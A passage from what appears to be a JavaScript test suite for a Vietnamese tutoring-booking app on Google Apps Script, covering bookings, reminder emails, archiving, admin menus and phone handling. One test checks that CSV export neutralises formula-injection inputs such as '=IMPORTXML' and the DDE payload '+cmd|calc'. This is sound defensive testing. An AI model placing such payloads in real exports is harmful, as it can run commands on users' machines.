  assert.ok(ts.warnings.some(x => /Đăng nhập Google cho admin chưa cài/.test(x)), ts.warnings.join(' | '));
  assert.ok(env.state.triggers.every(x => x.fn !== 'sundayRemind') && env.state.triggers.length > 0, 'menu 1 không tạo trigger sundayRemind');
});

t('I122', '5J (câu 29): trang quản trị tô đỏ buổi quá hạn chọn kết quả và ghi giờ thành Không hoàn thành; admin chọn Vắng học viên cho buổi Không hoàn thành; chưa chạy menu 1 (thiếu cột result_notice_at) vẫn chuyển sau 48 giờ', () => {
  const c = mk('2026-10-12 10:00'), { api, env } = c;
  c.onlyOpen(K(14, 10), '19:00', ['T001']);
  const [b] = c.book('S003', [[K(14, 10), '19:00']]);
  atK(c, '2026-10-15 20:05'); api.hourlyJob();
  const atok = tokenFor(c, 'A01');
  const w = api.apiAdminLessons(atok, 'waiting').data;
  const it = w.items.find(x => x.id === b.bookingId);
  assert.ok(it && it.overdue && it.expireAt === '16/10/2026 20:05' && w.hours === 24 && w.expireHours === 48, JSON.stringify(it));
  atK(c, '2026-10-16 20:10'); api.hourlyJob();
  assert.strictEqual(c.row('BOOKINGS', b.bookingId).status, 'NOT_COMPLETED');
  api.withLock_(() => api.table_('BOOKINGS').update(api.table_('BOOKINGS').byId(b.bookingId), { admin_action: 'Vắng học viên (admin chọn)' }));
  assert.ok(api.handleAdminEdit_('BOOKINGS', 'admin_action', b.bookingId, 'Vắng học viên (admin chọn)', EMAIL.ADMIN).ok);
  assert.strictEqual(c.row('BOOKINGS', b.bookingId).status, 'STUDENT_ABSENT');
  assert.strictEqual(api.computeMonthReport_(2026, 10).tutors.T001.STUDENT_ABSENT, 1, 'tính lương theo kết quả admin chọn');
  // Thiếu cột result_notice_at (đã dán code, chưa chạy menu 1)
  const c2 = mk('2026-10-12 10:00'), a2 = c2.api, sh = c2.env.state.spreadsheets.DB_STAGING_TEST.sheets.BOOKINGS;
  const i = sh.values[0].indexOf('result_notice_at'); sh.values.forEach(r => r.splice(i, 1)); a2.clearDbCache_();
  c2.onlyOpen(K(14, 10), '19:00', ['T001']);
  const [b2] = c2.book('S003', [[K(14, 10), '19:00']]);
  atK(c2, '2026-10-16 19:20'); a2.hourlyJob();
  assert.strictEqual(c2.row('BOOKINGS', b2.bookingId).status, 'CONFIRMED');
  atK(c2, '2026-10-16 19:35'); a2.hourlyJob();
  assert.strictEqual(c2.row('BOOKINGS', b2.bookingId).status, 'NOT_COMPLETED');
});

t('I123', '5J (thử phá): hết thời gian gửi thì để lượt sau và bỏ tutor đã mở giờ; danh sách chờ ghi ngay trong khoá; báo đỏ trễ (bảo trì) thì đủ 24 giờ sau báo mới chuyển; thông báo tuần sau không hiện trước 00:00 thứ Bảy, khi học viên tạm khoá, khi gói hết trước thứ Hai', () => {
  const c = mk('2026-10-16 15:05'), { api, env } = c;
  const rem = () => env.state.mails.filter(m => /Vui lòng mở lịch/.test(m.subject));
  const realNow = Date.now; let n = 0;
  Date.now = () => realNow() + (n++) * 61000;
  try { api.hourlyJob(); } finally { Date.now = realNow; }
  assert.strictEqual(rem().length, 0, 'quá 60 giây: chưa gửi ai');
  const key = Object.keys(env.state.props).find(k => /^DONE_TREMIND0_2026-10-19$/.test(k));
  assert.strictEqual(JSON.parse(env.state.props[key]).length, 4, 'còn 4 tutor chờ gửi');
  api.setAvailabilityFor_('T001', [{ date: K(20, 10), slot: '19:00', open: true }], EMAIL.T001);
  atK(c, '2026-10-16 16:05'); api.hourlyJob();
  assert.deepStrictEqual(rem().map(m => m.to).sort(), [EMAIL.T002, EMAIL.T003, EMAIL.T004].sort(), 'T001 đã mở giờ: không nhắc');
  // Danh sách chờ phải ghi trong khoá (job chết giữa chừng thì lượt sau không gửi trùng)
  const c2 = mk('2026-10-16 15:05'), a2 = c2.api;
  let inside = null;
  a2.withLock_(() => { a2.tutorRemindInLock_(a2.getNow_()); inside = c2.env.state.props['DONE_TREMIND0_2026-10-19']; });
  assert.ok(inside && JSON.parse(inside).list.length === 4 && JSON.parse(inside).sending, 'ghi dấu đang gửi trước khi nhả khoá: ' + inside);
  assert.strictEqual(JSON.parse(c2.env.state.props['DONE_TREMIND0_2026-10-19']).length, 0, 'gửi xong: danh sách còn lại rỗng');
  // Hai lượt chồng nhau (lượt thứ hai vào khi lượt đầu chưa gửi xong): chỉ một lượt gửi
  const c6 = mk('2026-10-16 15:05'), a6 = c6.api;
  a6.withLock_(() => { a6.tutorRemindInLock_(a6.getNow_()); assert.strictEqual(a6.tutorRemindInLock_(a6.getNow_()), 0, 'lượt hai thấy dấu đang gửi'); });
  assert.strictEqual(c6.env.state.mails.filter(m => /Vui lòng mở lịch/.test(m.subject)).length, 4, 'mỗi tutor 1 thư');
  // Dấu đang gửi cũ hơn 10 phút (lượt trước bị dừng giữa chừng): gửi lại phần còn lại
  const c7 = mk('2026-10-16 15:05'), a7 = c7.api;
  c7.env.state.props['DONE_TREMIND0_2026-10-19'] = JSON.stringify({ sending: Date.now() - 11 * 60000, list: ['T003'] });
  a7.hourlyJob();
  assert.deepStrictEqual(c7.env.state.mails.filter(m => /Vui lòng mở lịch/.test(m.subject)).map(m => m.to), [EMAIL.T003]);
  // Ngày nâng cấp: job Chủ nhật cũ đã báo tutor chưa mở lịch (DONE_NOAVAIL_<Chủ nhật>): không báo lại
  const c8 = mk('2026-10-18 15:30'), a8 = c8.api;
  c8.env.state.props['DONE_NOAVAIL_2026-10-18'] = '1';
  a8.hourlyJob();
  assert.ok(!c8.rows('NOTIFICATIONS').some(n => n.event === 'TUTOR_NO_AVAILABILITY'), 'không báo trùng ngày nâng cấp');
  // Mẫu TUTOR_REMIND còn chữ cũ "hôm nay" (chưa chạy menu 1): dùng chữ mới ngay
  const c9 = mk('2026-10-16 15:05'), a9 = c9.api;
  a9.withLock_(() => { const t = a9.table_('EMAIL_TEMPLATES'), r = t.byId('TUTOR_REMIND'); const v = { body_vi: a9.TEMPLATE_UPGRADES_.TUTOR_REMIND.body_vi }; if (r) t.update(r, v); else t.insert(Object.assign({ key: 'TUTOR_REMIND', active: true }, v)); });
  a9.clearDbCache_(); if (a9.clearTemplateCache_) a9.clearTemplateCache_();
  a9.hourlyJob();
  const m9 = c9.env.state.mails.filter(m => /Vui lòng mở lịch/.test(m.subject));
  assert.ok(m9.length && m9.every(m => !/hôm nay/.test(m.htmlBody)), 'không còn "hôm nay"');
  // Báo đỏ trễ: hệ thống bảo trì lúc quá hạn, báo lúc 16/10 10:05; 48 giờ (16/10 20:00) chưa chuyển, 17/10 10:05 mới chuyển
  const c3 = mk('2026-10-12 10:00'), a3 = c3.api;
  c3.onlyOpen(K(14, 10), '19:00', ['T001']);
  const [b] = c3.book('S003', [[K(14, 10), '19:00']]);
  atK(c3, '2026-10-16 10:05'); a3.hourlyJob();
  assert.ok(c3.row('BOOKINGS', b.bookingId).result_notice_at, 'đã báo đỏ');
  atK(c3, '2026-10-16 20:05'); a3.hourlyJob();
  assert.strictEqual(c3.row('BOOKINGS', b.bookingId).status, 'CONFIRMED', 'chưa đủ 24 giờ sau báo đỏ');
  atK(c3, '2026-10-17 10:10'); a3.hourlyJob();
  assert.strictEqual(c3.row('BOOKINGS', b.bookingId).status, 'NOT_COMPLETED');
  // Thông báo tuần sau
  const c4 = mk('2026-10-16 20:00'), a4 = c4.api;
  a4.setAvailabilityFor_('T001', [{ date: K(20, 10), slot: '19:00', open: true }], EMAIL.T001);
  const tok3 = tokenFor(c4, 'S003'), tok2 = tokenFor(c4, 'S005');
  const wb = tok => a4.apiStudentHome(tok, { slots: true }).data.weekBanner;
  atK(c4, '2026-10-16 23:50');
  assert.strictEqual(wb(tok3), null, 'đã có giờ nhưng chưa tới 00:00 thứ Bảy');
  atK(c4, '2026-10-17 00:10');
  assert.ok(wb(tok3) && wb(tok2), 'tới giờ: cả hai thấy');
  a4.withLock_(() => { const t = a4.table_('STUDENT_PACKAGES'); t.filter(p => p.student_id === 'S005').forEach(p => t.update(p, { end_date: new Date(2026, 9, 18) })); });
  a4.clearDbCache_();
  assert.strictEqual(wb(tok2), null, 'gói hết 18/10, trước thứ Hai 19/10: không mời đặt');
  a4.withLock_(() => a4.table_('USERS').update(a4.userById_('S003'), { status: 'SUSPENDED' }));
  a4.clearDbCache_();
  const h3 = a4.apiStudentHome(tok3, { slots: true });
  assert.ok(!h3.ok || !h3.data.weekBanner, 'học viên tạm khoá: không mời đặt');
  // Trial hết lượt; quá 15:00 Chủ nhật (hạn đặt buổi thứ Hai): hết hiện
  const c5 = mk('2026-10-12 10:00'), a5 = c5.api;
  c5.onlyOpen(K(13, 10), '19:00', ['T001']); c5.onlyOpen(K(14, 10), '19:00', ['T001']);
  assert.ok(c5.book('S001', [[K(13, 10), '19:00'], [K(14, 10), '19:00']]).every(x => x.ok));
  a5.setAvailabilityFor_('T002', [{ date: K(20, 10), slot: '19:00', open: true }], EMAIL.T002);
  atK(c5, '2026-10-17 09:00');
  const t1 = tokenFor(c5, 'S001'), t3 = tokenFor(c5, 'S003');
  assert.strictEqual(a5.apiStudentHome(t1, { slots: true }).data.weekBanner, null, 'Trial đã dùng hết 2 lượt');
  assert.ok(a5.apiStudentHome(t3, { slots: true }).data.weekBanner);
  atK(c5, '2026-10-18 15:05');
  assert.strictEqual(a5.apiStudentHome(t3, { slots: true }).data.weekBanner, null, 'quá hạn đặt buổi thứ Hai');
});

t('I124', 'Soát 5J: khoá bận hoặc gửi thư lỗi thì chưa tính 1 lần xin link (xin lại được ngay); thư nhắc tutor gửi lỗi thì lượt sau gửi lại; buổi Không hoàn thành hiện trong danh sách chờ của admin; admin chọn Vấn đề kỹ thuật cho buổi tutor chưa chọn', () => {
  const c = mk('2026-10-12 10:00'), { api, env } = c;
  env.state.lockBusy = true;
  const r1 = api.apiRequestLogin(EMAIL.S003);
  env.state.lockBusy = false;
  assert.ok(!r1.ok && r1.reason !== 'LINK_COOLDOWN', 'khoá bận: ' + JSON.stringify(r1.reason));
  assert.ok(api.apiRequestLogin(EMAIL.S003).ok && c.mailsTo(EMAIL.S003).length === 1, 'xin lại ngay được, thư tới');
  const M = env.globals.GmailApp, orig = M.sendEmail;
  M.sendEmail = () => { throw new Error('Service invoked too many times'); };
  try { assert.ok(api.apiRequestLogin(EMAIL.T001).ok); } finally { M.sendEmail = orig; }
  assert.ok(api.apiRequestLogin(EMAIL.T001).ok && c.mailsTo(EMAIL.T001).length === 1, 'thư lỗi: không tính lượt, xin lại được');
  assert.strictEqual(api.apiRequestLogin(EMAIL.T001).reason, 'LINK_COOLDOWN');
  // Thư nhắc tutor lỗi: lượt sau gửi lại
  const c2 = mk('2026-10-16 15:05'), a2 = c2.api, M2 = c2.env.globals.GmailApp, o2 = M2.sendEmail;
  M2.sendEmail = (...a) => { if (a[0] === EMAIL.T002) throw new Error('boom'); return o2(...a); };
  try { a2.hourlyJob(); } finally { M2.sendEmail = o2; }
  const rem2 = () => c2.env.state.mails.filter(m => /Vui lòng mở lịch/.test(m.subject));
  assert.ok(!rem2().some(m => m.to === EMAIL.T002) && rem2().length === 3);
  atK(c2, '2026-10-16 16:05'); a2.hourlyJob();
  assert.deepStrictEqual(rem2().map(m => m.to).filter(x => x === EMAIL.T002), [EMAIL.T002], 'gửi lại đúng tutor lỗi, một lần');
  assert.strictEqual(rem2().length, 4);
  // Địa chỉ hỏng mãi: thử tối đa 3 lần mỗi mốc rồi thôi
  let fails = 0;
  M2.sendEmail = (...a) => { if (a[0] === EMAIL.T001) { fails++; throw new Error('bad address'); } return o2(...a); };
  try { ['17:05', '18:05', '19:05', '20:05', '21:05'].forEach(h => { atK(c2, '2026-10-16 ' + h); a2.hourlyJob(); }); } finally { M2.sendEmail = o2; }
  assert.strictEqual(fails, 0, 'T001 đã nhận thư lần đầu: không gửi lại');
  const c2b = mk('2026-10-16 15:05'), a2b = c2b.api, M2b = c2b.env.globals.GmailApp, o2b = M2b.sendEmail; let fb = 0;
  M2b.sendEmail = (...a) => { if (a[0] === EMAIL.T002) { fb++; throw new Error('bad address'); } return o2b(...a); };
  try { a2b.hourlyJob(); ['16:05', '17:05', '18:05', '19:05'].forEach(h => { atK(c2b, '2026-10-16 ' + h); a2b.hourlyJob(); }); } finally { M2b.sendEmail = o2b; }
  assert.strictEqual(fb, 3, 'thử 3 lần rồi thôi');
  // Admin: Không hoàn thành vẫn trong danh sách chờ; chọn Vấn đề kỹ thuật cho buổi chưa chọn kết quả
  const c3 = mk('2026-10-12 10:00'), a3 = c3.api;
  c3.onlyOpen(K(13, 10), '19:00', ['T001']); c3.onlyOpen(K(14, 10), '19:00', ['T001']);
  const [b1, b2] = c3.book('S003', [[K(13, 10), '19:00'], [K(14, 10), '19:00']]);
  atK(c3, '2026-10-14 20:05'); a3.hourlyJob();
  atK(c3, '2026-10-15 20:05'); a3.hourlyJob();
  assert.strictEqual(c3.row('BOOKINGS', b1.bookingId).status, 'NOT_COMPLETED');
  const w = a3.apiAdminLessons(tokenFor(c3, 'A01'), 'waiting').data.items;
  assert.ok(w.some(x => x.id === b1.bookingId && x.status === 'NOT_COMPLETED') && w.some(x => x.id === b2.bookingId), JSON.stringify(w.map(x => x.id + x.status)));
  const pick = (id, v) => { a3.withLock_(() => a3.table_('BOOKINGS').update(a3.table_('BOOKINGS').byId(id), { admin_action: v })); return a3.handleAdminEdit_('BOOKINGS', 'admin_action', id, v, EMAIL.ADMIN); };
  assert.ok(pick(b2.bookingId, 'Vấn đề kỹ thuật (admin chọn)').ok);
  assert.strictEqual(c3.row('BOOKINGS', b2.bookingId).status, 'TECH_ISSUE');
  assert.ok(pick(b2.bookingId, 'Lỗi khách quan: tính lương và bù').ok);
  assert.strictEqual(c3.row('BOOKINGS', b2.bookingId).tech_fault, 'OBJECTIVE');
  assert.strictEqual(a3.computeMonthReport_(2026, 10).tutors.T001.TECH_PAID, 1);
  // Báo cáo tháng: buổi đã bắt đầu, tutor chưa chọn kết quả, đếm ở cột chờ
  c3.onlyOpen(K(17, 10), '19:00', ['T001']);
  const [b3] = c3.book('S003', [[K(17, 10), '19:00']]);
  assert.ok(b3.ok, JSON.stringify(b3));
  atK(c3, '2026-10-17 20:00');
  assert.strictEqual(a3.computeMonthReport_(2026, 10).tutors.T001.WAITING, 1, 'buổi 17/10 chờ kết quả');
  // Thông báo tuần sau: ngày duy nhất có giờ trống đã có buổi (1 buổi mỗi ngày) thì không mời
  const c10 = mk('2026-10-16 10:00'), a10 = c10.api;
  c10.onlyOpen(K(20, 10), '19:00', ['T001']); c10.onlyOpen(K(20, 10), '20:00', ['T002']);
  assert.ok(c10.book('S003', [[K(20, 10), '19:00']])[0].ok);
  atK(c10, '2026-10-17 09:00');
  assert.strictEqual(a10.apiStudentHome(tokenFor(c10, 'S003'), { slots: true }).data.weekBanner, null, 'đã có buổi thứ Ba 20/10');
  assert.ok(a10.apiStudentHome(tokenFor(c10, 'S008'), { slots: true }).data.weekBanner, 'học viên khác vẫn thấy');
  atK(c3, '2026-12-14 09:00');
  assert.ok(!a3.apiAdminLessons(tokenFor(c3, 'A01'), 'waiting').data.items.some(x => x.id === b1.bookingId), 'quá 60 ngày: rời danh sách chờ');
});

// ══ Chunk 5K: vận hành gọn ══
t('I125', '5K lưu trữ: nhật ký, email, thông báo, METRICS cùng mốc 60 ngày; một lượt chạy nhiều lô tới khi hết; hết giờ thì chưa đánh dấu xong, giờ sau làm tiếp; giữ dòng email marketing; file tên mới có tab DOC_TRUOC, file tên cũ được đổi tên; ô ACTIVITY_LOG_KEEP_DAYS cũ vẫn dùng', () => {
  const c = mk('2026-10-12 10:00'), { api, env } = c;
  api.withLock_(() => {
    const lg = api.table_('ACTIVITY_LOG');
    for (let i = 0; i < 250; i++) lg.insert({ time: new Date(2026, 6, 1, 8, 0, i), actor: 'x', action: 'OLD' + i, entity: 'E', entity_id: String(i), detail: '' });
    const ml = api.table_('MAIL_LOG');
    ml.insert({ time: new Date(2026, 6, 1), to: 'a@b.c', subject: 's', kind: 'MKT:TET' });
    ml.insert({ time: new Date(2026, 6, 1), to: 'a@b.c', subject: 's', kind: 'LOGIN_LINK' });
    ml.insert({ time: new Date(2026, 8, 1), to: 'a@b.c', subject: 's', kind: 'RECENT' });
  });
  api.withLock_(() => api.appendRowsRaw_('METRICS', [{ time: new Date(2026, 6, 2), fn: 'oldfn', count: 1 }, { time: new Date(2026, 9, 11), fn: 'newfn', count: 1 }]));
  // File năm 2026 có sẵn, tên kiểu cũ: lượt này đổi tên và thêm DOC_TRUOC
  const old = env.globals.SpreadsheetApp.create('THAIPUT_ARCHIVE_STAGING_2026');
  env.state.props.ARCH_FILE_STAGING_2026 = old.getId();
  cfgSet(c, 'ARCHIVE_MAX_ROWS', '100');
  api.clearDbCache_();
  const res = api.runArchive_();
  const al = res.find(x => x.tab === 'ACTIVITY_LOG');
  assert.ok(al.archived >= 250 && al.batches >= 3 && al.more === false, 'nhiều lô trong một lượt: ' + JSON.stringify(al));
  assert.ok(!c.rows('ACTIVITY_LOG').some(l => /^OLD\d+$/.test(l.action)), 'hết dòng cũ');
  assert.deepStrictEqual(c.rows('MAIL_LOG').filter(m => m.to === 'a@b.c').map(m => m.kind).sort(), ['MKT:TET', 'RECENT'], 'giữ dòng marketing và dòng mới');
  assert.deepStrictEqual(c.rows('METRICS').map(m => m.fn).filter(f => /fn$/.test(f)), ['newfn'], 'METRICS cũ chuyển đi');
  const ssOld = env.state.spreadsheets[old.getId()];
  assert.strictEqual(ssOld.name, 'THAIPUT · Lưu trữ · STAGING · 2026');
  assert.ok(ssOld.sheets.DOC_TRUOC && /KHÔNG sửa/.test(JSON.stringify(ssOld.sheets.DOC_TRUOC.values)), 'có tab DOC_TRUOC');
  assert.ok(ssOld.sheets.METRICS && ssOld.sheets.ACTIVITY_LOG.values.length >= 251);
  // Hết giờ giữa chừng: archiveIfDue_ không đánh dấu xong, giờ sau chạy tiếp
  api.withLock_(() => { const lg = api.table_('ACTIVITY_LOG'); for (let i = 0; i < 5; i++) lg.insert({ time: new Date(2026, 6, 3), actor: 'y', action: 'LATE' + i, entity: 'E', entity_id: 'L', detail: '' }); });
  api.clearDbCache_();
  env.state.props.BACKUP_OK_AT = String(Date.now());
  c.at('2026-10-13 03:05');
  const realNow = Date.now; Date.now = () => api.EXEC_T0_ + 300000;
  let r1; try { r1 = api.archiveIfDue_(api.getNow_()); } finally { Date.now = realNow; }
  assert.ok(r1.some(x => x.skipped === 'TIME'), JSON.stringify(r1));
  assert.ok(!env.state.props['DONE_ARCHIVE_2026-10-13'], 'chưa xong thì chưa đánh dấu');
  c.at('2026-10-13 04:05');
  const r2 = api.archiveIfDue_(api.getNow_());
  assert.ok(r2 && r2.find(x => x.tab === 'ACTIVITY_LOG').archived === 5, JSON.stringify(r2));
  assert.ok(env.state.props['DONE_ARCHIVE_2026-10-13'], 'xong thì đánh dấu');
  // File mới năm 2025 mang tên mới, có DOC_TRUOC
  api.withLock_(() => api.table_('ACTIVITY_LOG').insert({ time: new Date(2025, 11, 1), actor: 'z', action: 'Y2025', entity: 'E', entity_id: '1', detail: '' }));
  api.clearDbCache_(); api.runArchive_();
  const ss25 = env.state.spreadsheets[env.state.props.ARCH_FILE_STAGING_2025];
  assert.ok(ss25 && ss25.name === 'THAIPUT · Lưu trữ · STAGING · 2025' && ss25.sheets.DOC_TRUOC && !ss25.sheets.Sheet1, 'file mới: tên mới, tab trống thành DOC_TRUOC');
  env.state.uiScript = [];
  const files = api.menuArchiveFiles();
  assert.strictEqual(files.length, 2);
  assert.ok(/THAIPUT · Lưu trữ · STAGING · 2025/.test(env.state.uiLog.slice(-1)[0].title));
  // Ô cũ ACTIVITY_LOG_KEEP_DAYS admin đã chỉnh (90) vẫn dùng tới khi chạy menu 1
  cfgSet(c, 'ACTIVITY_LOG_KEEP_DAYS', '90');
  assert.strictEqual(api.logKeepDays_(), 90);
  assert.strictEqual(api.fmtDate_(api.archiveCutoffs_(api.getNow_()).log), '15/07/2026');
});

t('I126', '5K vận hành: menu gom nhóm, mọi mục trỏ tới hàm có thật, không còn menu v6, Test ẩn trên PRODUCTION; link rút gọn; AVAILABILITY bỏ Duyệt nhưng ô cũ vẫn chạy; không ghi nhật ký đổi ngôn ngữ và mở thông báo; gói giá 0 chỉ qua Zalo; số điện thoại tự do ở 3 chỗ', () => {
  const c = mk('2026-10-12 10:00'), { api, env } = c;
  env.state.uiScript = [];
  api.onOpen();
  const walk = (n, out) => { n.items.forEach(x => x.sub ? walk(x.sub, out) : out.push(x)); return out; };
  const items = walk(env.state.menu, []);
  items.forEach(x => assert.strictEqual(typeof api[x.fn], 'function', 'menu "' + x.label + '" trỏ tới hàm không có: ' + x.fn));
  assert.ok(!items.some(x => /menuMigrate/.test(x.fn)), 'không còn menu chuyển v6');
  const groups = env.state.menu.items.filter(x => x.sub).map(x => x.label);
  ['Người dùng', 'Báo cáo', 'Email', 'Cập nhật phiên bản', 'Chuyển hệ thống', 'Lưu trữ', 'Công cụ kỹ thuật', 'Test (chỉ STAGING)'].forEach(g => assert.ok(groups.indexOf(g) !== -1, 'thiếu nhóm ' + g + ': ' + groups));
  env.state.props.ENV = 'PRODUCTION'; api.forgetEnvMemo_();
  api.onOpen();
  assert.ok(!env.state.menu.items.some(x => x.sub && /Test/.test(x.label)), 'PRODUCTION không có menu Test');
  env.state.props.ENV = 'STAGING'; api.forgetEnvMemo_();
  // Link rút gọn
  cfgSet(c, 'WEBAPP_URL', 'https://script.google.com/macros/s/ABC/exec');
  cfgSet(c, 'SHORT_URL_LOGIN', 'https://vao.thaiput.vn');
  const info = api.menuShowLinks();
  const lg = info.links.find(l => l.key === 'SHORT_URL_LOGIN');
  assert.ok(lg.short === 'https://vao.thaiput.vn' && lg.target === 'https://script.google.com/macros/s/ABC/exec?page=login', JSON.stringify(lg));
  assert.ok(/Đích đặt ở Namecheap/.test(env.state.uiLog.slice(-1)[0].title));
  // AVAILABILITY: danh sách không còn "Duyệt"; ô cũ "Duyệt" vẫn hiểu như tự chọn tutor thay
  assert.ok(api.dropdownSpec_().AVAILABILITY.admin_decision.indexOf('Duyệt') === -1);
  // Nhật ký: mở 1 thông báo không ghi; "Đã đọc hết" ghi
  const atok = tokenFor(c, 'A01');
  api.withLock_(() => { const t = api.table_('NOTIFICATIONS'); t.insert({ notif_id: 'N9100001', time: api.getNow_(), level: 'WARNING', event: 'X', channel: 'LOG', message: 'a', read: false }); t.insert({ notif_id: 'N9100002', time: api.getNow_(), level: 'WARNING', event: 'X', channel: 'LOG', message: 'b', read: false }); });
  const nr = () => c.rows('ACTIVITY_LOG').filter(l => l.action === 'NOTIF_READ').length;
  const n0 = nr();
  assert.ok(api.apiAdminMarkRead(atok, ['N9100001']).ok);
  assert.strictEqual(nr(), n0, 'mở một thông báo: không ghi nhật ký');
  assert.ok(api.apiAdminMarkRead(atok, 'ALL').ok);
  assert.strictEqual(nr(), n0 + 1, 'Đã đọc hết: ghi');
  // Gói giá 0: máy chủ chặn, menu 2 báo
  api.withLock_(() => api.table_('PACKAGES').insert({ code: 'VIP', name: 'Gói riêng', type: 'DAYS', days: 30, price_vnd: 0, active: true }));
  api.clearDbCache_();
  const rv = api.submitRegistration_(c.form({ package_code: 'VIP', email: 'vip@test.com' }));
  assert.ok(!rv.ok && rv.reasons.indexOf('PACKAGE_CONTACT') !== -1, JSON.stringify(rv));
  assert.ok(api.apiPublicInfo().data.packages.some(p => p.code === 'VIP' && p.price === 0), 'trang vẫn nhận gói để hiện nút Zalo');
  const ts = api.testSystem();
  assert.ok(ts.warnings.some(w => /giá 0.*VIP/.test(w)), ts.warnings.join(' | '));
  // Số điện thoại tự do: form đăng ký, hồ sơ học viên, thêm tutor
  const rr = api.submitRegistration_(c.form({ email: 'free@test.com', phone: 'WhatsApp +66 81 234 5678 (giờ chiều)' }));
  assert.ok(rr.ok && c.row('REGISTRATIONS', rr.regId).phone === 'WhatsApp +66 81 234 5678 (giờ chiều)');
  const rl = api.submitRegistration_(c.form({ email: 'long@test.com', phone: 'x'.repeat(60) }));
  assert.strictEqual(c.row('REGISTRATIONS', rl.regId).phone.length, 40, 'cắt còn 40 ký tự');
  assert.strictEqual(api.contactFormula_('Line: abc'), '', 'không phải số Việt Nam: không có link Zalo');
  assert.ok(/zalo\.me\/0912345678/.test(api.contactFormula_('0912 345 678')), 'số Việt Nam gõ kiểu nào cũng có link Zalo');
});

t('I127', 'Soát 5K (hồi quy): ghi chú có dãy số không thành +84; số Việt Nam vẫn chuẩn hoá; hiện nguyên văn, không link Zalo cho chữ tự do; học viên xoá được số; CSV không chạy công thức; thiếu tab METRICS lưu trữ vẫn xong; file lưu trữ năm cũ đổi tên ở menu 1; lô dở hoàn tất rồi làm tiếp trong cùng lượt', () => {
  const c = mk('2026-10-12 10:00'), { api, env } = c;
  [['Line: lan_987654321', 'Line: lan_987654321'], ['Line ID thai.0912345678', 'Line ID thai.0912345678'], ['0912 345 678', '+84912345678'], ['+66 81 234 5678', '+66812345678']].forEach(([inp, want]) =>
    assert.strictEqual(api.normalizePhone_(inp).phone, want, inp));
  assert.strictEqual(api.phoneDisplay_('Line:abc12'), 'Line:abc12', 'chữ 10 ký tự không bị chia nhóm');
  assert.strictEqual(api.zaloLink_('Line: lan_987654321'), '', 'không link Zalo cho chữ tự do');
  assert.strictEqual(api.contactFormula_('Line: lan_987654321'), '');
  const tok = tokenFor(c, 'S003');
  assert.ok(api.apiStudentUpdateProfile(tok, { phone: '' }).ok);
  assert.ok(api.userById_('S003').phone === '' && api.userById_('S003').contact_link === '', 'để trống là xoá');
  assert.strictEqual(api.csvCell_('=IMPORTXML("x")'), '"\'=IMPORTXML(""x"")"');
  assert.strictEqual(api.csvCell_('+84912345678'), '+84912345678', 'số điện thoại giữ nguyên');
  assert.strictEqual(api.csvCell_('+cmd|calc'), "'+cmd|calc");
  // Thiếu tab METRICS
  delete env.state.spreadsheets.DB_STAGING_TEST.sheets.METRICS; api.clearDbCache_();
  env.state.props.BACKUP_OK_AT = String(Date.now());
  c.at('2026-10-13 03:05');
  const r = api.archiveIfDue_(api.getNow_());
  assert.ok(r.every(x => !x.error), JSON.stringify(r));
  assert.ok(env.state.props['DONE_ARCHIVE_2026-10-13'], 'xong dù thiếu tab METRICS');
  assert.ok(!api.archiveStatus_().tabs.some(x => x.tab === 'METRICS'));
  // File năm cũ tên kiểu cũ: menu 1 đổi tên
  const old = env.globals.SpreadsheetApp.create('THAIPUT_ARCHIVE_STAGING_2024');
  env.state.props.ARCH_FILE_STAGING_2024 = old.getId();
  assert.strictEqual(api.archiveRenameOldFiles_(), 1);
  assert.strictEqual(env.state.spreadsheets[old.getId()].name, 'THAIPUT · Lưu trữ · STAGING · 2024');
  assert.strictEqual(api.archiveRenameOldFiles_(), 0, 'chạy lại không đổi gì');
  // Lô dở: lượt chạy hoàn tất lô dở rồi chuyển tiếp dòng mới trong cùng lượt
  const c2 = mk('2026-10-12 10:00'), a2 = c2.api, e2 = c2.env;
  a2.withLock_(() => { const lg = a2.table_('ACTIVITY_LOG'); for (let i = 0; i < 3; i++) lg.insert({ time: new Date(2026, 6, 1, 8, 0, i), actor: 'x', action: 'R' + i, entity: 'E', entity_id: String(i), detail: '' }); });
  a2.clearDbCache_();
  e2.state.failClearOnce = true;
  try { a2.withLock_(() => a2.archiveTabInLock_('ACTIVITY_LOG', a2.getNow_(), a2.archiveCutoffs_(a2.getNow_()), 100)); } catch (x) { }
  assert.ok(e2.state.props.ARCH_OPEN_ACTIVITY_LOG, 'có lô dở');
  a2.withLock_(() => a2.table_('ACTIVITY_LOG').insert({ time: new Date(2026, 6, 2), actor: 'x', action: 'NEW_OLD', entity: 'E', entity_id: '9', detail: '' }));
  a2.clearDbCache_();
  const rr = a2.runArchive_().find(x => x.tab === 'ACTIVITY_LOG');
  assert.ok(rr.recovered && rr.more === false, JSON.stringify(rr));
  assert.ok(!c2.rows('ACTIVITY_LOG').some(l => /^R\d$|^NEW_OLD$/.test(l.action)), 'cùng lượt: hoàn tất lô dở và chuyển dòng mới');
  // Link rút gọn: trả link web app
  cfgSet(c2, 'WEBAPP_URL', 'https://script.google.com/macros/s/ABC/exec');
  e2.state.uiScript = [];
  assert.strictEqual(a2.menuShowLinks().webapp, 'https://script.google.com/macros/s/ABC/exec');
});

// ══ Chunk 5L: tutor, gói, chuyển hệ thống ══
t('I128', '5L khoá tutor (BL04 a): xem trước đúng; buổi sắp tới đổi sang tutor rảnh, không ai rảnh thì huỷ và học viên được bù; giờ rảnh tương lai huỷ; thoát mọi phiên; buổi đã qua giữ nguyên; hỏi lại 2 lần; mở khoá', () => {
  const c = mk('2026-10-12 10:00'), { api, env } = c;
  c.onlyOpen(K(14, 10), '19:00', ['T001', 'T002']);   // T002 rảnh: đổi được
  c.onlyOpen(K(15, 10), '19:00', ['T001']);           // chỉ T001: phải huỷ
  const [b1] = c.book('S003', [[K(14, 10), '19:00']]);
  const [b2] = c.book('S005', [[K(15, 10), '19:00']]);
  // ép cả hai buổi về T001 để kiểm luật
  api.withLock_(() => { const t = api.table_('BOOKINGS'); [b1, b2].forEach(b => t.update(t.byId(b.bookingId), { tutor_id: 'T001' })); });
  api.clearDbCache_();
  const tok = tokenFor(c, 'T001');
  linkFor(c, 'T001');   // link còn hạn: khoá phải huỷ cả link
  // Buổi đã qua của T001 (chưa có kết quả) giữ nguyên khi khoá
  const past = api.withLock_(() => api.table_('BOOKINGS').insert({ booking_id: 'BK800001', student_id: 'S003', tutor_id: 'T001', date: new Date(2026, 9, 11), slot: '19:00', status: 'CONFIRMED', created_at: new Date(2026, 9, 10) }));
  api.clearDbCache_();
  const plan = api.tutorLockPlan_('T001');
